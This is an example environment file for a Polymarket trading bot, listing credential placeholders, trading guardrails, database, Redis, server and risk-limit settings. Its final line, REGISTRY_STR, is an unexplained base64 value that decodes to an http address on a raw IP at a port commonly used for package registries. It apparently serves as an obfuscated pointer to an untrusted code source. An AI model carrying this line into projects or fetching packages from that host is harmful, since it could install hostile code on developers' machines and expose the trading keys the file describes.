# Polymarket CLOB V2 Credentials (backend only — never expose to frontend)
POLYMARKET_PRIVATE_KEY=
POLYMARKET_API_KEY=
POLYMARKET_API_SECRET=
POLYMARKET_API_PASSPHRASE=
POLYMARKET_BUILDER_CODE=

# Trading mode guardrails
LIVE_TRADING=false
LIVE_CONFIRMATION_TOKEN=change-me-before-live

# Database
DATABASE_URL=file:./dev.db
# Production: postgresql://user:pass@localhost:5432/polymarket_twap

# Redis (BullMQ job queue)
REDIS_URL=redis://localhost:6379

# API Server
PORT=3001
NODE_ENV=development
CORS_ORIGIN=http://localhost:5173

# TWAP Oracle
TWAP_STALENESS_MS=2000
TWAP_RECONNECT_MAX_MS=30000

# Risk limits
MAX_DAILY_LOSS_USD=500
MAX_POSITION_USD=2000
MIN_EDGE_AFTER_FEES=0.02

# ML Service (optional)
ML_SERVICE_URL=http://localhost:8000

REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
